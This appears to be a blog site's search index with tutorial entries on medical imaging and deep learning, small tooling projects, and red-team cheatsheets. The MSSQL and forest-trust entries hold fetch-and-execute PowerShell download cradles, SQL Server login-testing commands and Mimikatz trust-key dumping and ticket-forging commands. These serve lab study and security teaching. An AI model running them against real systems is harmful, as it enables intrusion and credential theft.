[{"authors":null,"categories":null,"content":"Giovanni Pecoraro is a Senior Security Engineer at RHEA Group. His research interests include space systems, cyber security, signal processing and artificial intelligence.\n","date":1682035200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1682035200,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"","publishdate":"0001-01-01T00:00:00Z","relpermalink":"","section":"authors","summary":"Giovanni Pecoraro is a Senior Security Engineer at RHEA Group. His research interests include space systems, cyber security, signal processing and artificial intelligence.","tags":null,"title":"Giovanni Pecoraro","type":"authors"},{"authors":["Giovanni Pecoraro"],"categories":["Deep Learning","Medical","Python"],"content":"Introduction The Brain Stroke CT Image Dataset from Kaggle provides normal and stroke brain Computer Tomography (CT) scans. The dataset presents very low activity even though it has been uploaded more than 2 years ago. It may be probably due to its quite low usability (3.13). The challenge is to get some interesting result, i.e., to try to perform brain stroke detection, even from this low-quality CT scans dataset. The followed approach is based on the usage of a 3D Convolutional Neural Network (CNN) in place of a standard 2D one. 2D CNNs are commonly used to process both grayscale (1 channel) and RGB images (3 channels), while a 3D CNN represents the 3D equivalent since it takes as input a 3D volume or a sequence of 2D frames, e.g. slices in a CT scan. The provided example takes inspiration from the great work 3D image classification from CT scans done by Hasib Zunair who clearly demonstrated how to use a 3D CNN to predict the presence of viral pneumonia from CT scans.\nDataset exploration The CT scans dataset is public available on Kaggle, but for the sake of simplicy it has been made available together with the present notebook on my GitHub so it can be easily downloaded without the need of an API key and additional Python packages.\nimport os import zipfile import tensorflow as tf # Download dataset from GitHub url = \u0026#34;https://github.com/Peco602/brain-stroke-detection-3d-cnn/releases/download/v0.0.1/brain_ct_data.zip\u0026#34; filename = os.path.join(os.getcwd(), \u0026#34;brain_ct_data.zip\u0026#34;) tf.keras.utils.get_file(filename, url) # Unzip dataset with zipfile.ZipFile(\u0026#34;brain_ct_data.zip\u0026#34;, \u0026#34;r\u0026#34;) as z_fp: z_fp.extractall(\u0026#34;.\u0026#34;) Downloading data from https://github.com/Peco602/brain-stroke-detection-3d-cnn/releases/download/v0.0.1/brain_ct_data.zip 63160014/63160014 [==============================] - 1s 0us/step !ls -al brain_ct_data total 92 drwxr-xr-x 4 root root 4096 Apr 21 07:03 . drwxr-xr-x 1 root root 4096 Apr 21 07:03 .. drwxr-xr-x 2 root root 49152 Apr 21 07:03 Normal drwxr-xr-x 2 root root 32768 Apr 21 07:03 Stroke The dataset contains both normal and stroke images respectively in the Normal and Stroke folders.\n!ls brain_ct_data/Normal | head 100 (10).jpg 100 (11).jpg 100 (12).jpg 100 (13).jpg 100 (14).jpg 100 (15).jpg 100 (16).jpg 100 (17).jpg 100 (18).jpg 100 (19).jpg !ls brain_ct_data/Stroke | head 58 (10).jpg 58 (11).jpg 58 (12).jpg 58 (13).jpg 58 (15).jpg 58 (17).jpg 58 (18).jpg 58 (19).jpg 58 (1).jpg 58 (20).jpg It is important to clarify the dataset does not contain CT scans, which are usually provided as DICOM or NIfTI files, but the CT scan slices in JPEG format (most probably extracted from DICOM or NIfTI files). A previous post clearly explains how to extract slice images from a DICOM file. Giving a further look to the slice images it is easy to understand the naming convention PATIENT_ID (SLICE_ID).jpg, e.g. 49 (1).jpg, 49 (2).jpg and for each patient ID several slices are available. The following function is able to plot up to 40 slices (if available) for a specific patient ID.\nimport matplotlib.pyplot as plt import imageio.v2 as imageio import numpy as np def plot_scan_from_path(slices_path, patient_id): \u0026#34;\u0026#34;\u0026#34;Plot 40 slices for a patient ID\u0026#34;\u0026#34;\u0026#34; num_rows = 4 num_columns = 10 factor = 1.2 f, axarr = plt.subplots( num_rows, num_columns, figsize=(num_columns*factor, num_rows*factor), ) f.suptitle(f\u0026#34;Patient {patient_id}\u0026#34;, y=1.1) image_id = 1 for i in range(num_rows): for j in range(num_columns): try: img = imageio.imread(f\u0026#39;{slices_path}/{patient_id} ({image_id}).jpg\u0026#39;) except Exception as e: print(e) img = np.zeros((2,2)) finally: axarr[i, j].imshow(img, cmap=\u0026#39;gray\u0026#39;) axarr[i, j].axis(\u0026#39;off\u0026#39;) image_id += 1 plt.subplots_adjust(wspace=0, hspace=0, left=0, right=1, bottom=0, top=1) plt.show() Let’s start with patient 49:\nplot_scan_from_path(slices_path=\u0026#39;brain_ct_data/Normal\u0026#39;, patient_id=49) No such file: \u0026#39;/content/brain_ct_data/Normal/49 (34).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/49 (35).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/49 (36).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/49 (37).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/49 (38).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/49 (39).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/49 (40).jpg\u0026#39; Patient 49 has 33 slices, but it is fundamental to underline the slices are not correctly sorted. It seems the slices go from the middle of the head to the top, but then they suddenly start back from the bottom. This may be among the reasons the dataset usability is low. This may not be an issue for a 2D CNN since it takes single images as input, but is a big obstacle for a 3D CNN where the volumetric representation of the brain is needed.\nplot_scan_from_path(slices_path=\u0026#39;brain_ct_data/Normal\u0026#39;, patient_id=50) No such file: \u0026#39;/content/brain_ct_data/Normal/50 (13).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/50 (15).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/50 (17).jpg\u0026#39; No such file: \u0026#39;/content/brain_ct_data/Normal/50 (19).jpg\u0026#39; …","date":1682035200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1682035200,"objectID":"789bb3424cd0565bbf26a31ec277fa04","permalink":"https://www.peco602.com/post/0100-brain-stroke-detection-3d-cnn/","publishdate":"2023-04-21T00:00:00Z","relpermalink":"/post/0100-brain-stroke-detection-3d-cnn/","section":"post","summary":"A tutorial on how to train a 3D Convolutional Neural Network (3D CNN) to detect the presence of brain stroke from Computer Tomography (CT) scans.","tags":["Image Processing","Deep Learning","Medical","DICOM","Python"],"title":"Brain stroke detection from CT scans via 3D Convolutional Neural Network","type":"post"},{"authors":null,"categories":null,"content":"Introduction Since some cloud providers offer free unlimited picture-only storage, the Archive-To-Images library allows to convert any collection of files into pictures to be uploaded without any additional cost.\nInstallation The package can be easily installed via pip package manager:\n$ pip install archive-to-images Usage as CLI Transform to images $ archive-to-images transform --help Usage: archive-to-images transform [OPTIONS] Transforms an archive into multiple images. ╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────╮ │ * --path -p TEXT Path containing data to be archived. [default: None] [required] │ │ * --name -n TEXT Name of the archive. [default: None] [required] │ │ --size -s [0.5|1|2|5|10] Maximum size of an image in MB. [default: 1] │ │ --encrypt -e Protect archive with password. │ │ --verbose -v Enable verbose output. │ │ --help Show this message and exit. │ ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯ Create an image collection from data contained in multiple paths.\n$ archive-to-images transform --path /home/alice/Desktop --path /home/alice/Documents --name ARCHIVE_ALICE Set the maximum image size in MB (default: 1):\n$ archive-to-images transform --path /home/alice/Desktop --path /home/alice/Documents --name ARCHIVE_ALICE -s 5 Encrypt data with a password:\n$ archive-to-images transform --path /home/alice/Desktop --path /home/alice/Documents --name ARCHIVE_ALICE -s 5 -e Restore from images $ archive-to-images restore --help Usage: archive-to-images restore [OPTIONS] Restores an archive from multiple images. ╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────╮ │ * --path -p TEXT Path containing images to be processed. [default: None] [required] │ │ --verbose -v Enable verbose output. │ │ --help Show this message and exit. │ ╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯ Restore the archives stored in image collections:\n$ archive-to-images restore --path /home/alice/Downloads/Album1 --path /home/alice/Downloads/Album2 The library will automatically find all the archives stored in the images and will output a zip archive for each one.\nUsage as docker Run the docker image and bind the current folder to the workspace path inside the container:\n$ docker run -it --rm -v $(pwd):/workspace peco602/archive_to_images:latest bash then it is possible to use the CLI directly from the container bash.\n","date":1678838400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1678838400,"objectID":"38ad94993bba6d5ddbe74b39b29859ef","permalink":"https://www.peco602.com/project/0060-archive-to-images/","publishdate":"2023-03-15T00:00:00Z","relpermalink":"/project/0060-archive-to-images/","section":"project","summary":"Archive-To-Images is a Python CLI to transform archives into images and reverse.","tags":["Python"],"title":"Archive-To-Images","type":"project"},{"authors":["Giovanni Pecoraro"],"categories":["Deep Learning","Medical","Python"],"content":"Introduction DICOM or Digital Imaging and Communications in medicine are image files sourced from different modalities, e.g., CT or MRI scans, and based on an international standard to transmit, store, retrieve, print, process, and display medical imaging information. DICOM files do not only contain the image, but also additional data, such as the patient identifier, date of birth, age, sex, and any other useful information about the diagnosis. Obviousely, DICOM files cannot be viewed as normal photos, so several DICOM viewers are available online (a list is available here), but, as always, Python can be very powerful in case additional processing is needed.\nPre-requisites First, the following libraries are required:\nPydicom: DICOM files reading and decoding library Numpy: Array manipulation library Pillow: Image processing library Matplotlib: Image visualization library and can be easily installed via the command:\npip install pydicom numpy pillow matplotlib Data structure Once the Python environment is ready and a DICOM file is available, it can be read via the dcmread() method.\nfrom pydicom import dcmread DICOM_PATH = \u0026#39;/home/user/Desktop/exam/MD44PKO2/T2T5OLJX/I7600000\u0026#39; ds = dcmread(DICOM_PATH) type(ds) pydicom.dataset.FileDataset This method returns a FileDataset instance, which in turn represents an extension of Dataset class. It makes reading and writing to file easier and wraps a dictionary of DataElement. A DataElement is then composed of the following parts:\na tag that identifies the attribute, usually in the format (XXXX,XXXX) with hexadecimal numbers, and may be divided further into DICOM Group Number and DICOM Element Number; a Value Representation (VR) that describes the data type and format of the attribute value. a Value Multiplicity (VM) that is automatically determined from the contents of the value. a value which can be one of: a regular numeric, string or text value as an int, float, str, bytes, etc a list of regular values (if VM\u0026gt;1) a Sequence instance, where a Sequence is a list of Dataset instances, where each Dataset contains DataElement instances, and so on… You can display the entire dataset by simply printing its string (str or repr) value:\nprint(ds) Dataset.file_meta ------------------------------- (0002, 0000) File Meta Information Group Length UL: 168 (0002, 0001) File Meta Information Version OB: b\u0026#39;\\x00\\x01\u0026#39; (0002, 0002) Media Storage SOP Class UID UI: CT Image Storage (0002, 0003) Media Storage SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600002074 (0002, 0010) Transfer Syntax UID UI: Explicit VR Little Endian (0002, 0012) Implementation Class UID UI: 1.2.840.113704.7.0.2 ------------------------------------------------- (0008, 0008) Image Type CS: [\u0026#39;DERIVED\u0026#39;, \u0026#39;SECONDARY\u0026#39;, \u0026#39;OTHER\u0026#39;, \u0026#39;CSA MPR\u0026#39;, \u0026#39;CSAPARALLEL\u0026#39;, \u0026#39;AXIAL\u0026#39;, \u0026#39;CT_SOM5 SEQ\u0026#39;] (0008, 0016) SOP Class UID UI: CT Image Storage (0008, 0018) SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600002074 (0008, 0020) Study Date DA: \u0026#39;20221215\u0026#39; (0008, 0021) Series Date DA: \u0026#39;20221215\u0026#39; (0008, 0022) Acquisition Date DA: \u0026#39;20221215\u0026#39; (0008, 0023) Content Date DA: \u0026#39;20221215\u0026#39; (0008, 0030) Study Time TM: \u0026#39;162614\u0026#39; (0008, 0031) Series Time TM: \u0026#39;163202\u0026#39; (0008, 0032) Acquisition Time TM: \u0026#39;162821.901196\u0026#39; (0008, 0033) Content Time TM: \u0026#39;163202.921000\u0026#39; (0008, 0050) Accession Number SH: \u0026#39;5895682501\u0026#39; (0008, 0060) Modality CS: \u0026#39;CT\u0026#39; (0008, 0061) Modalities in Study CS: [\u0026#39;CT\u0026#39;, \u0026#39;SR\u0026#39;] (0008, 0070) Manufacturer LO: \u0026#39;SIEMENS\u0026#39; (0008, 0080) Institution Name LO: \u0026#39;XXXXXXXXXX\u0026#39; (0008, 0081) Institution Address ST: \u0026#39;XXXXXXXXXX\u0026#39; (0008, 0090) Referring Physician\u0026#39;s Name PN: \u0026#39;MEDICO^REFERTANTE\u0026#39; (0008, 1010) Station Name SH: \u0026#39;CT55050\u0026#39; (0008, 1030) Study Description LO: \u0026#39;TC CRANIO (CAPO)\u0026#39; (0008, 1032) Procedure Code Sequence 1 item(s) ---- (0008, 0100) Code Value SH: \u0026#39;RS0932\u0026#39; (0008, 0104) Code Meaning LO: \u0026#39;TC CRANIO (CAPO)\u0026#39; --------- (0008, 103e) Series Description LO: \u0026#39;ax ok\u0026#39; (0008, 1048) Physician(s) of Record PN: \u0026#39;10440^NEUROLOGIA\u0026#39; (0008, 1070) Operators\u0026#39; Name PN: \u0026#39;meduser\u0026#39; (0008, 1080) Admitting Diagnoses Description LO: \u0026#39;-\u0026#39; (0008, 1090) Manufacturer\u0026#39;s Model Name LO: \u0026#39;Sensation 64\u0026#39; (0008, 1140) Referenced Image Sequence 1 item(s) ---- (0008, 1150) Referenced SOP Class UID UI: CT Image Storage (0008, 1155) Referenced SOP Instance UID UI: 1.3.12.2.1107.5.1.4.55050.30000022121515300815600001998 --------- (0008, 2111) Derivation Description ST: \u0026#39;MEDCOM RESAMPLED\u0026#39; (0010, 0010) Patient\u0026#39;s Name PN: \u0026#39;ROSSI^MARIO\u0026#39; (0010, 0020) Patient ID LO: \u0026#39;99999999\u0026#39; (0010, 0021) Issuer of Patient ID LO: \u0026#39;X1V1_MPI\u0026#39; (0010, 0030) Patient\u0026#39;s Birth Date DA: \u0026#39;19330101\u0026#39; (0010, 0040) Patient\u0026#39;s Sex CS: \u0026#39;M\u0026#39; (0010, 1010) Patient\u0026#39;s Age AS: \u0026#39;090Y\u0026#39; (0010, 1040) Patient\u0026#39;s Address CS: \u0026#39;XXXXXXXXXX\u0026#39; (0018, 0015) Body Part Examined CS: \u0026#39;HEAD\u0026#39; (0018, 0050) Slice Thickness DS: \u0026#39;0.6\u0026#39; (0018, 0060) KVP DS: \u0026#39;120.0\u0026#39; (0018, 1000) Device Serial Number LO: \u0026#39;55050\u0026#39; (0018, 1020) Software Versions LO: \u0026#39;syngo CT 2014A\u0026#39; (0018, 1030) Protocol Name LO: \u0026#39;CBM_encefalo_SEQ\u0026#39; (0018, 1110) …","date":1677110400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1677110400,"objectID":"41a580bff70ef3adf3425ee7cd8a0a24","permalink":"https://www.peco602.com/post/0090-python-dicom/","publishdate":"2023-02-23T00:00:00Z","relpermalink":"/post/0090-python-dicom/","section":"post","summary":"A key step towards the application of Deep Learning to medical images is the understanding of Digital Imaging and Communications in Medicine (DICOM) which represents the standard for the communication and management of medical imaging.","tags":["Image Processing","Deep Learning","Medical","DICOM","Python"],"title":"DICOM images in Python: An overview","type":"post"},{"authors":null,"categories":null,"content":"Introduction Container solution to compile Rust projects for Linux, macOS and Windows.\nBuild the image docker build -t rust-universal-compiler:latest . Configure the project To allow cross-compilation from Linux to Windows and MacOS, it is necessary to create in the project folder the .cargo/config file containing the following lines:\n[target.x86_64-pc-windows-msvc] rustflags = [\u0026#34;-C\u0026#34;, \u0026#34;target-feature=+crt-static\u0026#34;] [target.x86_64-apple-darwin] linker = \u0026#34;x86_64-apple-darwin14-clang\u0026#34; ar = \u0026#34;x86_64-apple-darwin14-ar\u0026#34; Compile the project Compile for Linux (x86_64-unknown-linux-gnu):\ndocker run --rm -v $PWD/test-project:/app -w /app rust-universal-compiler:latest cargo build --target x86_64-unknown-linux-gnu --release Compile for MacOS (x86_64-apple-darwin):\ndocker run --rm -v $PWD/test-project:/app -w /app rust-universal-compiler:latest cargo build --target x86_64-apple-darwin --release Compile for Windows (x86_64-pc-windows-msvc):\ndocker run --rm -v $PWD/test-project:/app -w /app rust-universal-compiler:latest cargo build --target x86_64-pc-windows-msvc --release DockerHub peco602/rust-universal-compiler Bibliography https://github.com/Jake-Shadle/xwin https://wapl.es/rust/2019/02/17/rust-cross-compile-linux-to-macos.html ","date":1670371200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1670371200,"objectID":"f178d8e168d6b5af3cc9f96c0d60056c","permalink":"https://www.peco602.com/project/0050-rust-universal-compiler/","publishdate":"2022-12-07T00:00:00Z","relpermalink":"/project/0050-rust-universal-compiler/","section":"project","summary":"Container solution to compile Rust projects for Linux, macOS and Windows.","tags":["Rust"],"title":"Rust Universal Compiler","type":"project"},{"authors":["Lazzaro di Biase","Pasquale Maria Pecoraro","Giovanni Pecoraro","Maria Letizia Caminiti","Vincenzo Di Lazzaro"],"categories":null,"content":"","date":166752e4,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":166752e4,"objectID":"b12d5612ef0dad6c5565a1c2f9e92f6a","permalink":"https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/","publishdate":"2022-11-04T00:00:00Z","relpermalink":"/publication/0090-markerless-rf-monitoring-telemedicine/","section":"publication","summary":"Different technologies have been proposed for indoor monitoring over the past decades, with different degrees of invasiveness, complexity, and capabilities in full-body monitoring. In recent years, among all available technologies, there has been an increasing interest in using RF-based technology because it can provide a more accurate and reliable method of tracking patients' movements compared to other methods, such as camera-based systems or wearable sensors.","tags":["Telemedicine","Gait Analysis","Fall Detection","Tremor Analysis","Vital Signs Montioring","Sleep Monitoring"],"title":"Markerless radio frequency indoor monitoring for telemedicine: gait analysis, indoor positioning, fall detection, tremor analysis, vital signs and sleep monitoring","type":"publication"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Windows Management Instrumentation (WMI) is Microsoft’s implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM). WMI provides a unique interface for applications/scripts to manage a local or remote network or computer.\nWMI can be used for Red/Blue Teaming because:\nit is enabled on all Windows systems by default; it really mixes well with existing network traffic; it provides execution and persistence with SYSTEM privileges; it is often neglected by defenders. By default, the WMI service – Winmgmt is running and listening on port 135. DCOM connections are established on port 135, while subsequent data exchanged on port dictated by HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Internet – Ports (REG_MULTI_SZ) configurable via DCOMCNFG.exe.\nWMI Basics WMI Components Component Description Managed Objects Component being managed by WMI (e.g. process, service, operating system). Managed Objects Format (MOF) files Used to define WMI namespaces, classes, providers, etc. Classes Represent items in WMI (e.g. process, hardware, service) Repository The database used to store the static data (definitions) of classes. Namespaces Created by providers, they are used to divide classes logically (e.g. root\\cimv2, root\\default, root\\security). Providers Just like a driver, works as a bridge between a managed object and WMI. They generally exist for every MOF file. Consumers Applications or scripts which can be used to interact with WMI classes (e.g. powershell, wmic). Exploring commands WMI Commands - PowerShell v2 Get-Command -CommandType Cmdlet *wmi* | select name Get-WmiObject Invoke-WmiMethod Register-WmiEvent Remove-WmiObject Set-WmiInstance CIM Commands - PowerShell v3 CIM commands use WS-MAN so they can be used also against boxes where WMI is blocked but WS-MAN (WinRM) is enabled (even if the target has PowerShell version 2). They can be used also against non-Windows boxes.\nGet-Command -CommandType Cmdlet *cim* | select name Get-CimAssociatedInstance Get-CimClass Get-CimInstance Get-CimSession Invoke-CimMethod New-CimInstance New-CimSession New-CimSessionOption Register-CimIndicationEvent Remove-CimInstance Remove-CimSession Set-CimInstance WMI and CIM commands relations WMI CIM Get-WmiObject Get-CmiInstance Get-WmiObject -List Get-CmiClass Invoke-WmiMethod Invoke-CimMethod Register-WmiEvent Register-CimIndicationEvent Remove-WmiObject Remove-CimInstance Set-WmiInstance Set-CimInstance Exploring namespaces within root namespace Get-WmiObject -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; Get-WmiObject -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; | select name Get-CimInstance -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; | select name # Recursively list nested namespaces Get-WmiNamespace.ps1 Exploring classes and objects Once we have a namespace, we can explore its classes. Classes represent items in WMI like process, hardware, service, etc.\nGet classes If not specified, root/cim2 is the default namespace. Use -List parameter for Get-WmiObject.\nGet-WmiObject -Namespace root\\cimv2 -Class *bios* -List Get-WmiObject -Class *bios* -List Get-CimClass -Namespace root\\cimv2 -Class *bios* Get-CimClass -Class *bios* Get-CimClass -QualifierName dynamic Get instances of a class (objects) Get-WmiObject -Class Win32_BIOS Get-CimInstance -ClassName Win32_BIOS Filtering objects Get-WmiObject -Class Win32_Process -Filter \u0026#34;Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; Get-CimInstance -ClassName Win32_Process -Filter \u0026#34;Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; | fl * Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq \u0026#34;explorer.exe\u0026#34;} Get-CimInstance -ClassName Win32_Process | Where-Object {$_.Name -eq \u0026#34;explorer.exe\u0026#34;} Get-WmiObject -Query \u0026#34;select * from Win32_Process where Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; Get-CimInstance -Query \u0026#34;select * from Win32_Process where Name = \u0026#39;explorer.exe\u0026#39;\u0026#34; Example of WMI usage Get computer name, domain and local groups:\n# Explore namespaces to find the correct one Get-WmiObject -Namespace \u0026#34;root\u0026#34; -Class \u0026#34;__Namespace\u0026#34; | select name Get-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; # Computer name and domain Get-CimInstance -Namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_ComputerSystem | Format-List -Property * # Local groups Get-CimInstance -Namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Group | Format-List -Property * List installed software:\nGet-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Product | Format-List -Property * Get installed antivirus:\nGet-CimClass -Namespace \u0026#34;root/SecurityCenter2\u0026#34; Get-CimInstance -namespace \u0026#34;root/SecurityCenter2\u0026#34; -ClassName AntiVirusProduct | Format-List -Property * List files and folders:\nGet-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; # Files Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName CIM_DataFile | Format-List -Property * # Shared folders Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Share | Format-List -Property * # Local folders Get-CimInstance -namespace \u0026#34;root/cimv2\u0026#34; -ClassName Win32_Directory | Format-List -Property * Get security logs:\nGet-CimClass -Namespace \u0026#34;root/cimv2\u0026#34; …","date":1664409600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1664409600,"objectID":"6af0c0dd63c31a907c3d47c60abaf752","permalink":"https://www.peco602.com/post/0080-wmi-cheatsheet/","publishdate":"2022-09-29T00:00:00Z","relpermalink":"/post/0080-wmi-cheatsheet/","section":"post","summary":"Windows Management Instrumentation (WMI) provides a unique interface  to manage a local or remote network or computer and thus can be used by both Red and Blue Teams.","tags":["Red Teaming","Windows","Active Directory","WMI"],"title":"Windows Management Instrumentation cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"What is SQL Server?\nA database platform A Windows application A set of Windows Services Important Notes\nOS command are usually executed as the service account The service account is a sysadmin by default Clustered servers are required to have the same service account How do I authenticate?\nAccount Types:\nWindows Account: Used to login Mapped to SQL Server login SQL Server Login Used to login Mapped to database account Database User Used to access databases Important Roles\nServer Roles: Sysadmin = Database Administrator Public Role = Everyone with CONNECT Database Roles: Database Owner = SQL login that owns the database ☺ DB_OWNER role = Allows members to take most actions in the database A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.\nPowerUpSQL Setup All possible setup options: # Download to Disk + Import Module # Download from https://github.com/NetSPI/PowerUpSQL Import-Module PowerUpSQL.psd1 # Download/Import to Memory: Download Cradle 1 IEX(New-Object System.Net.WebClient).DownloadString(\u0026#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1\u0026#34;) # Download/Import to Memory: Common Download Cradle 2 \u0026amp;([scriptblock]::Create((new-object net.webclient).downloadstring(\u0026#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1\u0026#34;))) # Install Module from PowerShell Gallery Install-Module -Name PowerUpSQL List all PowerUpSQL available functions: Get-Command –Module PowerUpSQL Get-Help [FUNCTION_NAME] -Full Discovery .NET Classes - Remote Discovery [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources() Local Discovery # PowerUpSQL # OS Authentication Level: Local User # Technique: Locate services and registry keys Get-SQLInstanceLocal Remote Discovery List SQL Servers using UDP port scan:\n# PowerUpSQL # OS Authentication Level: Unauthenticated # Technique: UDP port scan Get-SQLInstanceScanUDP -Verbose -ComputerName \u0026#34;COMPUTER1\u0026#34; Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName \u0026#34;COMPUTER1\u0026#34; # Get the instance list from a file Get-SQLInstanceFile -FilePath c:\\temp\\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose List SQL Servers using UDP broadcast ping:\n# PowerUpSQL # OS Authentication Level: Unauthenticated # Technique: UDP broadcast ping Get-SQLInstanceBroadcast -Verbose List SQL Servers using TCP port scan (MSSQL exposes port 1433):\n# Nishang # OS Authentication Level: Unauthenticated # Technique: TCP port scan Invoke-PortScan -StartAddress [START_IP_ADDRESS] -EndAddress [END_IP_ADDRESS] -ScanPort -Port 1433 -Verbose # PowerSploit # OS Authentication Level: Unauthenticated # Technique: TCP port scan Invoke-PortScan -Hosts \u0026#34;COMPUTER1\u0026#34; -Ports 1433 -Verbose $result = Invoke-PortScan -Hosts @(\u0026#34;COMPUTER1\u0026#34;,\u0026#34;COMPUTER2\u0026#34;) -Verbose $result | | % { echo $_.hostname $_.openPorts} List Active Directory Domain SQL Server Instances:\nUsing current domain credentials:\n# PowerUpSQL # OS Authentication Level: Domain User # Technique: Query ADS via LDAP for SPNs Get-SQLInstanceDomain # List SQL Server instances running as a specific domain account Get-SQLInstanceDomain -DomainAccount \u0026#34;SQLSvc\u0026#34; # List shared domain user SQL Server service accounts (not machine account \u0026#34;*$\u0026#34;): Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($_.name -notlike \u0026#34;*$\u0026#34;) -and ($_.count -gt 1) } Using alternative domain credentials:\nrunas /noprofile /netonly /user:\u0026#34;CYBERCORP\\STUDENT1\u0026#34; PowerShell.exe Import-Module PowerUpSQL.psd1 Get-SQLInstanceDomain -Verbose -DomainController \u0026#34;CYBERCORP-DC.CYBERCORP.LOCAL\u0026#34; -Username \u0026#34;CYBERCORP\\STUDENTI1\u0026#34; -password \u0026#34;PASSWORD\u0026#34; Initial Access How do I get access?\nCommon Methods:\nAttempt to login with local or domain user privileges (Very Common) Computer accounts work too ☺ Weak SQL Server login passwords Default SQL Server login passwords Default SQL Server login passwords associated with 3rd party applications Why can domain users log to SQL Server?\nDomain users added to role (Week devops) Local users added to role Privilege inheritance (Mostly express versions) Check SQL Server accessibility Unauthenticated user # PowerUpSQL # OS Authentication Level: Unauthenticated Get-SQLInstanceUDPScan | Get-SQLConnectionTestThreaded -Verbose -Threads 15 -Username \u0026#34;testuser\u0026#34; -Password \u0026#34;testpass\u0026#34; Local user # PowerUpSQL # OS Authentication Level: Local User Get-SQLInstanceLocal | Get-SQLConnectionTestThreaded -Verbose Domain user # PowerUpSQL # OS Authentication Level: Domain User Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose # Get a list of domain SQL servers that can be logged into with a provided SQL Server login Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username \u0026#34;testuser\u0026#34; -password \u0026#34;testpass\u0026#34; Alternative …","date":1663804800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1663804800,"objectID":"a70b1a7e1f744b422c9d435d4efa5a68","permalink":"https://www.peco602.com/post/0070-mssql-cheatsheet/","publishdate":"2022-09-22T00:00:00Z","relpermalink":"/post/0070-mssql-cheatsheet/","section":"post","summary":"MSSQL Servers integrate right out the box with Windows and Active Directory Domains. Consequently, there are trust relationships wich we can be leveraged from an attacker perspective.","tags":["Red Teaming","Windows","Active Directory","MSSQL"],"title":"Microsoft SQL Server cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Using Trust Tickets Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g BloodHound to look for foreign group memberships between forests.\nOnce again, we require the trust key for the inter-forest trust:\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::trust /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; # or Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; An inter-forest TGT can be forged:\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:evilcorp.local /ticket:C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well.\n# asktgs.exe .\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi 